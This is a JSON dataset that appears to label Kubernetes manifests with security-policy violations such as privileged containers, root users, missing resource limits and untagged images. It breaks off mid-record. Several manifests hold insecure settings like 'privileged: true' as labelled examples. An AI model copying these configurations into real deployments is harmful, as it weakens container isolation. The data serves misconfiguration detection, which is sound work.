[
  {
    "id": "03337",
    "manifest_path": "data/manifests/the_stack_sample/sample_1438.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openvpn-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: openvpn-server\n  template:\n    metadata:\n      labels:\n        app: openvpn-server\n    spec:\n      containers:\n      - name: openvpn-server\n        image: quay.io/sjenning/poc:openvpn\n        imagePullPolicy: Always\n        command:\n        - /usr/sbin/openvpn\n        - --config\n        - /etc/openvpn/server/server.conf\n        workingDir: /etc/openvpn/server\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /etc/openvpn/server\n          name: server\n        - mountPath: /etc/openvpn/ccd\n          name: ccd\n      volumes:\n      - secret:\n          secretName: openvpn-server\n        name: server\n      - secret:\n          secretName: openvpn-ccd\n        name: ccd\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"openvpn-server\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "03338",
    "manifest_path": "data/manifests/the_stack_sample/sample_1438.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openvpn-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: openvpn-server\n  template:\n    metadata:\n      labels:\n        app: openvpn-server\n    spec:\n      containers:\n      - name: openvpn-server\n        image: quay.io/sjenning/poc:openvpn\n        imagePullPolicy: Always\n        command:\n        - /usr/sbin/openvpn\n        - --config\n        - /etc/openvpn/server/server.conf\n        workingDir: /etc/openvpn/server\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /etc/openvpn/server\n          name: server\n        - mountPath: /etc/openvpn/ccd\n          name: ccd\n      volumes:\n      - secret:\n          secretName: openvpn-server\n        name: server\n      - secret:\n          secretName: openvpn-ccd\n        name: ccd\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"openvpn-server\" is privileged"
  },
  {
    "id": "03339",
    "manifest_path": "data/manifests/the_stack_sample/sample_1438.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openvpn-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: openvpn-server\n  template:\n    metadata:\n      labels:\n        app: openvpn-server\n    spec:\n      containers:\n      - name: openvpn-server\n        image: quay.io/sjenning/poc:openvpn\n        imagePullPolicy: Always\n        command:\n        - /usr/sbin/openvpn\n        - --config\n        - /etc/openvpn/server/server.conf\n        workingDir: /etc/openvpn/server\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /etc/openvpn/server\n          name: server\n        - mountPath: /etc/openvpn/ccd\n          name: ccd\n      volumes:\n      - secret:\n          secretName: openvpn-server\n        name: server\n      - secret:\n          secretName: openvpn-ccd\n        name: ccd\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"openvpn-server\" is not set to runAsNonRoot"
  },
  {
    "id": "03340",
    "manifest_path": "data/manifests/the_stack_sample/sample_1438.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openvpn-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: openvpn-server\n  template:\n    metadata:\n      labels:\n        app: openvpn-server\n    spec:\n      containers:\n      - name: openvpn-server\n        image: quay.io/sjenning/poc:openvpn\n        imagePullPolicy: Always\n        command:\n        - /usr/sbin/openvpn\n        - --config\n        - /etc/openvpn/server/server.conf\n        workingDir: /etc/openvpn/server\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /etc/openvpn/server\n          name: server\n        - mountPath: /etc/openvpn/ccd\n          name: ccd\n      volumes:\n      - secret:\n          secretName: openvpn-server\n        name: server\n      - secret:\n          secretName: openvpn-ccd\n        name: ccd\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"openvpn-server\" has cpu request 0"
  },
  {
    "id": "03341",
    "manifest_path": "data/manifests/the_stack_sample/sample_1438.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: openvpn-server\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: openvpn-server\n  template:\n    metadata:\n      labels:\n        app: openvpn-server\n    spec:\n      containers:\n      - name: openvpn-server\n        image: quay.io/sjenning/poc:openvpn\n        imagePullPolicy: Always\n        command:\n        - /usr/sbin/openvpn\n        - --config\n        - /etc/openvpn/server/server.conf\n        workingDir: /etc/openvpn/server\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /etc/openvpn/server\n          name: server\n        - mountPath: /etc/openvpn/ccd\n          name: ccd\n      volumes:\n      - secret:\n          secretName: openvpn-server\n        name: server\n      - secret:\n          secretName: openvpn-ccd\n        name: ccd\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"openvpn-server\" has memory limit 0"
  },
  {
    "id": "03342",
    "manifest_path": "data/manifests/the_stack_sample/sample_1440.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7631\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03343",
    "manifest_path": "data/manifests/the_stack_sample/sample_1440.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7631\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03344",
    "manifest_path": "data/manifests/the_stack_sample/sample_1440.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7631\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03345",
    "manifest_path": "data/manifests/the_stack_sample/sample_1440.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7631\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03346",
    "manifest_path": "data/manifests/the_stack_sample/sample_1440.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7631\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03347",
    "manifest_path": "data/manifests/the_stack_sample/sample_1444.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20180622-df01a7f2b\n          args:\n          - --config-path=/etc/config/config\n          - --job-config-path=/etc/job-config\n          - --github-token-path=/etc/github/oauth\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n          - name: job-config\n            mountPath: /etc/job-config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: config\n        - name: job-config\n          configMap:\n            name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"branchprotector\" does not have a read-only root file system"
  },
  {
    "id": "03348",
    "manifest_path": "data/manifests/the_stack_sample/sample_1444.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20180622-df01a7f2b\n          args:\n          - --config-path=/etc/config/config\n          - --job-config-path=/etc/job-config\n          - --github-token-path=/etc/github/oauth\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n          - name: job-config\n            mountPath: /etc/job-config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: config\n        - name: job-config\n          configMap:\n            name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"branchprotector\" is not set to runAsNonRoot"
  },
  {
    "id": "03349",
    "manifest_path": "data/manifests/the_stack_sample/sample_1444.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20180622-df01a7f2b\n          args:\n          - --config-path=/etc/config/config\n          - --job-config-path=/etc/job-config\n          - --github-token-path=/etc/github/oauth\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n          - name: job-config\n            mountPath: /etc/job-config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: config\n        - name: job-config\n          configMap:\n            name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"branchprotector\" has cpu request 0"
  },
  {
    "id": "03350",
    "manifest_path": "data/manifests/the_stack_sample/sample_1444.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20180622-df01a7f2b\n          args:\n          - --config-path=/etc/config/config\n          - --job-config-path=/etc/job-config\n          - --github-token-path=/etc/github/oauth\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n          - name: job-config\n            mountPath: /etc/job-config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: config\n        - name: job-config\n          configMap:\n            name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"branchprotector\" has memory limit 0"
  },
  {
    "id": "03351",
    "manifest_path": "data/manifests/the_stack_sample/sample_1448.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: nightly-test-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: http://el-test-nightly.default.svc.cluster.local:8080\n          - name: TARGET_PROJECT\n            value: operator\n          - name: NAMESPACE\n            value: bastion-p\n          - name: REGISTRY\n            value: ppc64le-cluster.bastion-p.svc.cluster.local:443\n          - name: TARGET_ARCH\n            value: ppc64le\n          - name: REMOTE_SECRET_NAME\n            value: ppc64le-kubeconfig\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable REMOTE_SECRET_NAME in container \"trigger\" found"
  },
  {
    "id": "03352",
    "manifest_path": "data/manifests/the_stack_sample/sample_1448.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: nightly-test-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: http://el-test-nightly.default.svc.cluster.local:8080\n          - name: TARGET_PROJECT\n            value: operator\n          - name: NAMESPACE\n            value: bastion-p\n          - name: REGISTRY\n            value: ppc64le-cluster.bastion-p.svc.cluster.local:443\n          - name: TARGET_ARCH\n            value: ppc64le\n          - name: REMOTE_SECRET_NAME\n            value: ppc64le-kubeconfig\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"trigger\" is using an invalid container image, \"\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03353",
    "manifest_path": "data/manifests/the_stack_sample/sample_1448.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: nightly-test-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: http://el-test-nightly.default.svc.cluster.local:8080\n          - name: TARGET_PROJECT\n            value: operator\n          - name: NAMESPACE\n            value: bastion-p\n          - name: REGISTRY\n            value: ppc64le-cluster.bastion-p.svc.cluster.local:443\n          - name: TARGET_ARCH\n            value: ppc64le\n          - name: REMOTE_SECRET_NAME\n            value: ppc64le-kubeconfig\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"trigger\" does not have a read-only root file system"
  },
  {
    "id": "03354",
    "manifest_path": "data/manifests/the_stack_sample/sample_1448.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: nightly-test-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: http://el-test-nightly.default.svc.cluster.local:8080\n          - name: TARGET_PROJECT\n            value: operator\n          - name: NAMESPACE\n            value: bastion-p\n          - name: REGISTRY\n            value: ppc64le-cluster.bastion-p.svc.cluster.local:443\n          - name: TARGET_ARCH\n            value: ppc64le\n          - name: REMOTE_SECRET_NAME\n            value: ppc64le-kubeconfig\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"trigger\" is not set to runAsNonRoot"
  },
  {
    "id": "03355",
    "manifest_path": "data/manifests/the_stack_sample/sample_1448.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: nightly-test-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: http://el-test-nightly.default.svc.cluster.local:8080\n          - name: TARGET_PROJECT\n            value: operator\n          - name: NAMESPACE\n            value: bastion-p\n          - name: REGISTRY\n            value: ppc64le-cluster.bastion-p.svc.cluster.local:443\n          - name: TARGET_ARCH\n            value: ppc64le\n          - name: REMOTE_SECRET_NAME\n            value: ppc64le-kubeconfig\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"trigger\" has cpu request 0"
  },
  {
    "id": "03356",
    "manifest_path": "data/manifests/the_stack_sample/sample_1448.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: nightly-test-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: http://el-test-nightly.default.svc.cluster.local:8080\n          - name: TARGET_PROJECT\n            value: operator\n          - name: NAMESPACE\n            value: bastion-p\n          - name: REGISTRY\n            value: ppc64le-cluster.bastion-p.svc.cluster.local:443\n          - name: TARGET_ARCH\n            value: ppc64le\n          - name: REMOTE_SECRET_NAME\n            value: ppc64le-kubeconfig\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"trigger\" has memory limit 0"
  },
  {
    "id": "03357",
    "manifest_path": "data/manifests/the_stack_sample/sample_1450.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20220510-5840068ce9\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"statusreconciler\" does not have a read-only root file system"
  },
  {
    "id": "03358",
    "manifest_path": "data/manifests/the_stack_sample/sample_1450.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20220510-5840068ce9\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"statusreconciler\" is not set to runAsNonRoot"
  },
  {
    "id": "03359",
    "manifest_path": "data/manifests/the_stack_sample/sample_1450.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20220510-5840068ce9\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"statusreconciler\" has cpu request 0"
  },
  {
    "id": "03360",
    "manifest_path": "data/manifests/the_stack_sample/sample_1450.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20220510-5840068ce9\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"statusreconciler\" has memory limit 0"
  },
  {
    "id": "03361",
    "manifest_path": "data/manifests/the_stack_sample/sample_1451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      serviceAccountName: demo-sa\n      containers:\n      - name: nginx\n        image: nginx:1.13-alpine\n        ports:\n        - containerPort: 80\n        securityContext:\n          runAsUser: 0\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03362",
    "manifest_path": "data/manifests/the_stack_sample/sample_1451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      serviceAccountName: demo-sa\n      containers:\n      - name: nginx\n        image: nginx:1.13-alpine\n        ports:\n        - containerPort: 80\n        securityContext:\n          runAsUser: 0\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03363",
    "manifest_path": "data/manifests/the_stack_sample/sample_1451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      serviceAccountName: demo-sa\n      containers:\n      - name: nginx\n        image: nginx:1.13-alpine\n        ports:\n        - containerPort: 80\n        securityContext:\n          runAsUser: 0\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03364",
    "manifest_path": "data/manifests/the_stack_sample/sample_1451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      serviceAccountName: demo-sa\n      containers:\n      - name: nginx\n        image: nginx:1.13-alpine\n        ports:\n        - containerPort: 80\n        securityContext:\n          runAsUser: 0\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03365",
    "manifest_path": "data/manifests/the_stack_sample/sample_1452.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-pod\nspec:\n  containers:\n  - name: my-pod\n    image: nginx:1.21\n    resources:\n      limits:\n        cpu: 25m\n      requests:\n        cpu: 25m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"my-pod\" does not have a read-only root file system"
  },
  {
    "id": "03366",
    "manifest_path": "data/manifests/the_stack_sample/sample_1452.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-pod\nspec:\n  containers:\n  - name: my-pod\n    image: nginx:1.21\n    resources:\n      limits:\n        cpu: 25m\n      requests:\n        cpu: 25m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"my-pod\" is not set to runAsNonRoot"
  },
  {
    "id": "03367",
    "manifest_path": "data/manifests/the_stack_sample/sample_1452.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-pod\nspec:\n  containers:\n  - name: my-pod\n    image: nginx:1.21\n    resources:\n      limits:\n        cpu: 25m\n      requests:\n        cpu: 25m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"my-pod\" has memory limit 0"
  },
  {
    "id": "03368",
    "manifest_path": "data/manifests/the_stack_sample/sample_1453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9785\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03369",
    "manifest_path": "data/manifests/the_stack_sample/sample_1453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9785\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03370",
    "manifest_path": "data/manifests/the_stack_sample/sample_1453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9785\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03371",
    "manifest_path": "data/manifests/the_stack_sample/sample_1453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9785\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03372",
    "manifest_path": "data/manifests/the_stack_sample/sample_1453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9785\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03373",
    "manifest_path": "data/manifests/the_stack_sample/sample_1456.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rhynelabkube1-8d2f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: rhynelabkube1-8d2f\n  template:\n    metadata:\n      labels:\n        app: rhynelabkube1-8d2f\n    spec:\n      containers:\n      - name: rhynelabkube1-8d2f\n        image: rhynelabkubereg.azurecr.io/rhynelabkube1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"rhynelabkube1-8d2f\" is using an invalid container image, \"rhynelabkubereg.azurecr.io/rhynelabkube1\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03374",
    "manifest_path": "data/manifests/the_stack_sample/sample_1456.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rhynelabkube1-8d2f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: rhynelabkube1-8d2f\n  template:\n    metadata:\n      labels:\n        app: rhynelabkube1-8d2f\n    spec:\n      containers:\n      - name: rhynelabkube1-8d2f\n        image: rhynelabkubereg.azurecr.io/rhynelabkube1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rhynelabkube1-8d2f\" does not have a read-only root file system"
  },
  {
    "id": "03375",
    "manifest_path": "data/manifests/the_stack_sample/sample_1456.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rhynelabkube1-8d2f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: rhynelabkube1-8d2f\n  template:\n    metadata:\n      labels:\n        app: rhynelabkube1-8d2f\n    spec:\n      containers:\n      - name: rhynelabkube1-8d2f\n        image: rhynelabkubereg.azurecr.io/rhynelabkube1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rhynelabkube1-8d2f\" is not set to runAsNonRoot"
  },
  {
    "id": "03376",
    "manifest_path": "data/manifests/the_stack_sample/sample_1456.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rhynelabkube1-8d2f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: rhynelabkube1-8d2f\n  template:\n    metadata:\n      labels:\n        app: rhynelabkube1-8d2f\n    spec:\n      containers:\n      - name: rhynelabkube1-8d2f\n        image: rhynelabkubereg.azurecr.io/rhynelabkube1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"rhynelabkube1-8d2f\" has cpu request 0"
  },
  {
    "id": "03377",
    "manifest_path": "data/manifests/the_stack_sample/sample_1456.yaml",
